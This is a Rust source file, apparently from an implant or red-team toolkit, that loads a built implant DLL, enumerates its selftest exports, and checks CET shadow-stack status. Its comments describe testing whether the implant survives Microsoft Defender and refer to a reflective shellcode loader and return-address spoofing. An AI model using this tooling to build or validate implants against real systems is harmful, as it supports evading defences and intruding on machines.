//! Host-side DLL probe — loads a built implant DLL via `LoadLibraryW` and
//! enumerates its `nyx_selftest_*` exports.
//!
//! The on-target reflective loader is now realized — see
//! [`crate::on_target`] for the Layer-2 PIC shellcode (decrypt + reflective
//! PE map) and [`crate::generate_loader_stub`] for the blob emitter. This
//! `dll_probe` remains as a host-side sanity check that actually runs on the
//! engagement box:
//!
//!   * "does the implant DLL load cleanly under Defender?" — `LoadLibraryW`
//!     triggers the real Windows loader, the import-table resolver, and any
//!     DLL_PROCESS_ATTACH path; if Defender would block it, or a syscall
//!     struct layout is wrong, the load fails here.
//!   * "what selftests does it export?" — walk the export address table and
//!     report every `nyx_selftest_*` symbol so the operator knows the exact
//!     rundll32 entry surface without `dumpbin`/PE-browsing.
//!
//! Run on the Windows engagement box (`cargo run` or a small `examples/`
//! bin). NOT a `no_std`/PIC component — it pulls in the OS loader, so it is
//! host-side by construction. On non-Windows dev hosts the whole module
//! compiles to an empty shim so the workspace stays green on macOS.
//!
//! # Example
//!
//! ```no_run
//! # #[cfg(target_os = "windows")]
//! # fn main() -> Result<(), nyx_loader::dll_probe::ProbeError> {
//! #     use nyx_loader::dll_probe::DllProbe;
//!     let probe = DllProbe::load(r"C:\implant\nyx_implant_win.dll")?;
//!     println!("exports: {:?}", probe.exports());
//!     println!("cet_status: {}", probe.cet_status());
//! #     Ok(())
//! # }
//! # #[cfg(not(target_os = "windows"))]
//! # fn main() {}
//! ```

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use std::ffi::OsString;
use std::os::windows::ffi::OsStrExt;
use std::os::windows::io::RawHandle;
use std::path::Path;

// ---------------------------------------------------------------------------
// Hand-rolled Win32 FFI
// ---------------------------------------------------------------------------
// We use raw `extern "system"` declarations instead of pulling in `windows-sys`
// to keep this single-purpose crate dependency-free on the Windows side. The
// signatures match the Win32 SDK exactly (LoadLibraryW / GetProcAddress /
// FreeLibrary / IsProcessorFeaturePresent).

type HModule = RawHandle;

#[link(name = "kernel32")]
extern "system" {
    /// `LoadLibraryW(lpLibFileName: *const u16) -> HMODULE` — NULL on failure.
    fn LoadLibraryW(lp_lib_file_name: *const u16) -> HModule;
    /// `GetProcAddress(hModule, lpProcName: *const u8) -> FARPROC`. The name
    /// pointer must point to a NUL-terminated ASCII string (the Win32 loader
    /// does NOT accept wide names here).
    fn GetProcAddress(h_module: HModule, lp_proc_name: *const u8) -> *const c_void;
    /// `FreeLibrary(hModule) -> BOOL` (nonzero = freed).
    fn FreeLibrary(h_module: HModule) -> i32;
    /// `IsProcessorFeaturePresent(feature: u32) -> BOOL`. Feature 41 =
    /// `PF_RETURN_CONTROL_ENFORCE` (CET shadow stack). Same probe the live
    /// implant's `caller_spoof::is_cet_enabled` uses, so the two agree.
    fn IsProcessorFeaturePresent(feature: u32) -> i32;
}

/// Win32 processor-feature constant for CET shadow stack (HSP). Mirrors
/// `crates/implant-win/src/caller_spoof.rs::PF_CET_SHADOW_STACK` so the host
/// probe and the implant's runtime probe report the same thing.
const PF_CET_SHADOW_STACK: u32 = 41;

/// Prefix every implant selftest export is named with. Matching this prefix is
/// how `exports()` distinguishes selftest entry points from the few mandated
/// DLL exports (`DllMain`, etc.).
pub const SELFTEST_PREFIX: &str = "nyx_selftest_";

// ---------------------------------------------------------------------------
// PE export directory layout (IMAGE_EXPORT_DIRECTORY from winnt.h)
// ---------------------------------------------------------------------------
// The loader-side way to enumerate exports without `dumpbin`: parse the
// optional header's data directory[0] (export table), then walk the
// AddressOfNames array of RVA strings. All offsets are RVAs from the module
// base, exactly as the PE spec lays out — this is what `GetProcAddress` does
// internally for a single name, generalised to "all names".

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _pad: [u32; 3],
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageExportDirectory {
    _characteristics: u32,
    _time_date_stamp: u32,
    _major_version: u16,
    _minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinales: u32,
}

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/// Errors produced by [`DllProbe::load`] and friends.
#[derive(Debug)]
#[non_exhaustive]
pub enum ProbeError {
    /// The DLL path contained a NUL — cannot be turned into a wide Win32 path.
    PathHasNul,
    /// `LoadLibraryW` returned NULL. The OS error string (from
    /// `GetLastError`) is captured eagerly at the call site; this carries it
    /// so a caller can surface "Defender blocked the load" vs "missing dep".
    LoadFailed(String),
    /// The loaded image is not a valid PE (bad MZ/PE signature, truncated).
    /// Distinct from `LoadFailed` because the OS loader accepted the image
    /// but our export-table walk could not parse it.
    BadImageFormat(&'static str),
    /// The export directory RVA pointed outside the mapped module.
    ExportDirectoryOutOfRange,
}

impl std::fmt::Display for ProbeError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PathHasNul => write!(f, "DLL path contains a NUL byte"),
            Self::LoadFailed(msg) => write!(f, "LoadLibraryW failed: {msg}"),
            Self::BadImageFormat(msg) => write!(f, "bad PE image: {msg}"),
            Self::ExportDirectoryOutOfRange => {
                write!(f, "export directory RVA outside module range")
            }
        }
    }
}

impl std::error::Error for ProbeError {}

// ---------------------------------------------------------------------------
// DllProbe
// ---------------------------------------------------------------------------

/// A loaded implant DLL plus its enumerated `nyx_selftest_*` export table.
///
/// Drop frees the module via `FreeLibrary` (the loader refcount is what keeps
/// the image mapped; releasing it unmaps the pages and invalidates every
/// resolved function pointer, so callers must not retain `extern "system"`
/// function pointers past the probe's lifetime).
pub struct DllProbe {
    module: HModule,
    /// Cached `(export name, RVA-from-base)` pairs, collected once at load.
    /// RVAs (not absolute addresses) so they stay meaningful in diagnostics
    /// even after a FreeLibrary/reload cycle.
    selftest_exports: Vec<(String, u32)>,
}

impl DllProbe {
    /// Load a DLL by path via `LoadLibraryW` and enumerate its selftests.
    ///
    /// This is the "does it load?" gate: the real Windows loader runs, the
    /// IAT is resolved, and if the DLL has a `DllMain` it receives
    /// `DLL_PROCESS_ATTACH`. A load that succeeds here will also succeed
    /// under `rundll32` on the same host.
    pub fn load(path: &Path) -> Result<Self, ProbeError> {
        // Build a NUL-terminated UTF-16 path for LoadLibraryW, rejecting
        // interior NULs (which the loader would silently truncate at).
        let path_os: OsString = path.as_os_str().into();
        let mut wide: Vec<u16> = Vec::with_capacity(path_os.len() + 1);
        for w in path_os.encode_wide() {
            if w == 0 {
                return Err(ProbeError::PathHasNul);
            }
            wide.push(w);
        }
        wide.push(0);

        // SAFETY: LoadLibraryW takes a pointer to a NUL-terminated wide string
        // we just built and own; it does not retain the pointer. The path was
        // validated for interior NULs above.
        let module = unsafe { LoadLibraryW(wide.as_ptr()) };
        if module.is_null() {
            return Err(ProbeError::LoadFailed(last_error_string()));
        }

        // Parse the export table. Any failure here is a structurally-bad
        // image (the OS loader accepted it, but we can't walk its exports).
        let selftest_exports = match unsafe { enumerate_selftest_exports(module) } {
            Ok(v) => v,
            Err(e) => {
                // Don't leak the module if we're about to throw.
                unsafe { FreeLibrary(module) };
                return Err(e);
            }
        };

        Ok(Self {
            module,
            selftest_exports,
        })
    }

    /// The `nyx_selftest_*` export names discovered at load time, sorted
    /// alphabetically for stable diff-friendly output.
    pub fn exports(&self) -> Vec<String> {
        let mut names: Vec<String> = self
            .selftest_exports
            .iter()
            .map(|(n, _)| n.clone())
            .collect();
        names.sort();
        names
    }

    /// Resolve a selftest export to an absolute function pointer and call it.
    ///
    /// The export must take no arguments and return a `u64` (the implant's
    /// selftest convention — they pack a bitmask into RAX and call
    /// `ExitProcess` themselves for the real-exit variants, but the few that
    /// just return — e.g. `selftest_cet_status`, `selftest_display_count` —
    /// are safe to call this way). Returns the RAX value.
    ///
    /// Returns an error if the named export is not in the selftest table.
    pub fn call_selftest(&self, name: &str) -> Result<u64, ProbeError> {
        // Look the name up in our cached export table first — this is the
        // cheap "is this a known selftest" gate that avoids calling arbitrary
        // non-selftest exports (DllMain, nyx_linger*, etc.) by mistake.
        let rva = self
            .selftest_exports
            .iter()
            .find(|(n, _)| n == name)
            .map(|(_, rva)| *rva)
            .ok_or(ProbeError::BadImageFormat("selftest export not found"))?;
        // Re-resolve via GetProcAddress so the function pointer is the real
        // loader-sanctioned address. RVA is used as the "yes it's in our
        // table" sentinel above; GetProcAddress also handles forwarders
        // (selftests never use them, but the pattern is safer).
        let _ = rva;
        let mut name_buf: Vec<u8> = name.as_bytes().to_vec();
        name_buf.push(0); // NUL
                          // SAFETY: `module` is a live HMODULE we own for the lifetime of self.
                          // name_buf is a NUL-terminated ASCII byte string (selftest names are
                          // all ASCII by convention).
        let proc = unsafe { GetProcAddress(self.module, name_buf.as_ptr()) };
        if proc.is_null() {
            return Err(ProbeError::BadImageFormat(
                "GetProcAddress returned NULL for known selftest",
            ));
        }
        // SAFETY: the caller asserts (via the `nyx_selftest_*` naming
        // contract) that the target is a `extern "system" fn() -> u64`.
        let f: unsafe extern "system" fn() -> u64 = unsafe { core::mem::transmute(proc) };
        Ok(unsafe { f() })
    }

    /// Probe CET shadow-stack status via the same `IsProcessorFeaturePresent`
    /// call the implant's `caller_spoof::is_cet_enabled` uses. Returns `true`
    /// if CET is enforced on this process (i.e. the implant's return-address
    /// spoof path would degrade to a plain call).
    ///
    /// This is the host-side mirror of the implant's
    /// `selftest_cet_status` — useful for correlating "DLL-load-time CET
    /// status" with whatever the implant itself reports once running.
    pub fn cet_status(&self) -> bool {
        // SAFETY: IsProcessorFeaturePresent is a pure query with no
        // precondition beyond a valid feature id.
        unsafe { IsProcessorFeaturePresent(PF_CET_SHADOW_STACK) != 0 }
    }

    /// Raw HMODULE — exposed for callers that want to do their own
    /// `GetProcAddress` / structured walking outside this probe.
    pub fn module(&self) -> HModule {
        self.module
    }
}

impl Drop for DllProbe {
    fn drop(&mut self) {
        // SAFETY: we own the HMODULE from LoadLibraryW and have not yet freed
        // it; no outstanding &self.method borrows can still be using the
        // mapped image after Drop takes &mut self.
        if !self.module.is_null() {
            unsafe { FreeLibrary(self.module) };
        }
    }
}

// ---------------------------------------------------------------------------
// PE export-table walk
// ---------------------------------------------------------------------------

/// Walk the export address table and collect every `nyx_selftest_*` name.
///
/// # Safety
/// `module` must be a valid HMODULE returned by `LoadLibrary*` and still
/// mapped (not yet FreeLibrary-ed).
unsafe fn enumerate_selftest_exports(module: HModule) -> Result<Vec<(String, u32)>, ProbeError> {
    let base = module as usize;
    if base == 0 {
        return Err(ProbeError::BadImageFormat("null module base"));
    }

    // ── DOS header → e_lfanew ──────────────────────────────────────────────
    let dos = unsafe { &*(base as *const ImageDosHeader) };
    if dos.e_magic != 0x5A4D {
        return Err(ProbeError::BadImageFormat("bad MZ signature"));
    }
    let e_lfanew = dos.e_lfanew as usize;

    // ── PE signature ───────────────────────────────────────────────────────
    let pe_sig = unsafe { *((base + e_lfanew) as *const u32) };
    if pe_sig != 0x0000_4550 {
        return Err(ProbeError::BadImageFormat("bad PE signature"));
    }

    // ── COFF header → size_of_optional_header ──────────────────────────────
    let file_hdr = unsafe { &*((base + e_lfanew + 4) as *const ImageFileHeader) };
    let opt_off = e_lfanew + 4 + 20; // sig(4) + COFF(20)
    let dd_off = opt_off + file_hdr.size_of_optional_header as usize;

    // PE32+ optional header magic at opt_off is 0x020B; we don't need it
    // here, only data_directory[0] (export table), which sits at dd_off.
    // On PE32+ the optional header's NumberOfRvaAndSizes field precedes the
    // data directory; data_directory[0] is always the export dir regardless.
    let export_dd = unsafe { &*((base + dd_off) as *const ImageDataDirectory) };
    if export_dd.virtual_address == 0 || export_dd.size == 0 {
        // No exports at all — valid DLL, just nothing to enumerate.
        return Ok(Vec::new());
    }

    let export_dir_va = export_dd.virtual_address as usize;
    let export_dir = unsafe { &*((base + export_dir_va) as *const ImageExportDirectory) };

    let names_rva = export_dir.address_of_names as usize;
    let n = export_dir.number_of_names as usize;
    if n == 0 {
        return Ok(Vec::new());
    }

    // Bounds-check the names array against the mapped image. We don't know
    // the exact SizeOfImage here without parsing further, so use a generous
    // upper bound: the export directory's declared size tells us the table
    // fits inside [export_dir_va .. export_dir_va + export_dd.size]. The
    // AddressOfNames array must lie within that range.
    let names_end = names_rva
        .checked_add(n * 4)
        .ok_or(ProbeError::ExportDirectoryOutOfRange)?;
    let table_end = export_dir_va
        .checked_add(export_dd.size as usize)
        .ok_or(ProbeError::ExportDirectoryOutOfRange)?;
    if names_end > table_end {
        return Err(ProbeError::ExportDirectoryOutOfRange);
    }

    let mut out = Vec::with_capacity(n);
    for i in 0..n {
        // Each entry in AddressOfNames is a u32 RVA to a NUL-terminated ASCII
        // string. Walk until NUL or a sanity cap (export names are < 64 KiB).
        let name_rva_ptr = (base + names_rva + i * 4) as *const u32;
        let name_rva = unsafe { name_rva_ptr.read_unaligned() } as usize;
        if name_rva == 0 {
            continue;
        }
        let name_ptr = (base + name_rva) as *const u8;
        let mut buf = Vec::new();
        let mut ok = true;
        for _ in 0..0xFFFF {
            let b = unsafe { name_ptr.add(buf.len()).read_unaligned() };
            if b == 0 {
                break;
            }
            buf.push(b);
            if name_rva + buf.len() >= table_end {
                ok = false;
                break;
            }
        }
        if !ok || buf.is_empty() {
            continue;
        }
        let name = match std::str::from_utf8(&buf) {
            Ok(s) => s.to_string(),
            Err(_) => continue, // skip non-UTF-8 (forwarders / oddities)
        };
        if name.starts_with(SELFTEST_PREFIX) {
            out.push((name, name_rva as u32));
        }
    }

    Ok(out)
}

/// Capture `GetLastError` as a human-readable string. Best-effort: if
/// `FormatMessageW` itself fails (very unlikely), returns the raw code.
fn last_error_string() -> String {
    #[link(name = "kernel32")]
    extern "system" {
        fn GetLastError() -> u32;
        fn FormatMessageW(
            flags: u32,
            source: *const c_void,
            message_id: u32,
            language_id: u32,
            buffer: *mut u16,
            size: u32,
            arguments: *const c_void,
        ) -> u32;
    }

    const FORMAT_MESSAGE_FROM_SYSTEM: u32 = 0x0000_1000;
    const FORMAT_MESSAGE_IGNORE_INSERTS: u32 = 0x0000_0200;

    // SAFETY: both calls are pure queries; FormatMessageW writes into our
    // stack buffer of the declared capacity.
    unsafe {
        let code = GetLastError();
        let mut buf = [0u16; 512];
        let len = FormatMessageW(
            FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            core::ptr::null(),
            code,
            0,
            buf.as_mut_ptr(),
            buf.len() as u32,
            core::ptr::null(),
        );
        if len == 0 {
            return format!("GetLastError={code}");
        }
        let s = String::from_utf16_lossy(&buf[..len as usize]);
        format!("GetLastError={code}: {}", s.trim_end())
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// We can't `LoadLibrary` a real implant DLL in CI (the DLL isn't built
    /// there and Defender's behaviour is host-specific). What we CAN test on
    /// every Windows host is that `DllProbe::load` correctly surfaces a
    /// missing-file path as `LoadFailed` rather than panicking.
    #[test]
    fn load_missing_file_returns_load_failed() {
        let bogus = Path::new(r"C:\nonexistent\nyx_does_not_exist.dll");
        match DllProbe::load(bogus) {
            Err(ProbeError::LoadFailed(_)) => { /* expected */ }
            other => panic!("expected ProbeError::LoadFailed, got {other:?}"),
        }
    }

    /// Path with an interior NUL must be rejected before we hand it to
    /// `LoadLibraryW` (which would otherwise silently truncate).
    #[test]
    fn path_with_interior_nul_is_rejected() {
        // Build an OsString that contains an interior NUL — on Windows this
        // is a real failure mode (registry / symbolic-link paths).
        let mut bad = std::ffi::OsString::from("C:\\imp");
        bad.push("\0");
        bad.push("lant.dll");
        match DllProbe::load(Path::new(&bad)) {
            Err(ProbeError::PathHasNul) => { /* expected */ }
            other => panic!("expected ProbeError::PathHasNul, got {other:?}"),
        }
    }

    /// `cet_status` is a pure query and must not panic on any host. We don't
    /// assert the result (CET presence depends on the CPU + process policy),
    /// only that the call is well-formed.
    #[test]
    fn cet_status_does_not_panic() {
        // LoadLibraryEx the current EXE with DONT_RESOLVE_DLL_REFERENCES so we
        // get a valid HMODULE for a structurally-sound PE without triggering
        // DllMain a second time. DllProbe::drop's FreeLibrary then drops the
        // refcount we bumped here, leaving the image's refcount unchanged.
        #[link(name = "kernel32")]
        extern "system" {
            fn LoadLibraryExW(
                lp_lib_file_name: *const u16,
                h_file: *const c_void,
                dw_flags: u32,
            ) -> HModule;
        }
        const DONT_RESOLVE_DLL_REFERENCES: u32 = 0x0000_0001;
        let exe = match std::env::current_exe() {
            Ok(p) => p,
            Err(_) => return, // skip on hosts where current_exe is unavailable
        };
        let mut wide: Vec<u16> = Vec::new();
        for w in exe.as_os_str().encode_wide() {
            if w == 0 {
                return; // skip on interior-NUL paths
            }
            wide.push(w);
        }
        wide.push(0);
        let h = unsafe {
            LoadLibraryExW(
                wide.as_ptr(),
                core::ptr::null(),
                DONT_RESOLVE_DLL_REFERENCES,
            )
        };
        if h.is_null() {
            return; // skip — the probe path isn't loadable in this context
        }
        let probe = DllProbe {
            module: h,
            selftest_exports: Vec::new(),
        };
        let _ = probe.cet_status();
        // probe dropped here → FreeLibrary on the refcount-bumped handle.
    }

    /// `SELFTEST_PREFIX` is a contract the export filter relies on; pin it so
    /// a typo'd rename is caught.
    #[test]
    fn selftest_prefix_is_stable() {
        assert_eq!(SELFTEST_PREFIX, "nyx_selftest_");
        assert!("nyx_selftest_fs".starts_with(SELFTEST_PREFIX));
        assert!(!"DllMain".starts_with(SELFTEST_PREFIX));
        assert!(!"nyx_selftest".starts_with(SELFTEST_PREFIX)); // missing trailing _
    }
}

// Non-Windows shim so the workspace compiles on macOS/Linux. Everything above
// is `#![cfg(target_os = "windows")]`; on other targets the module is empty
// and the re-export in lib.rs is gated.
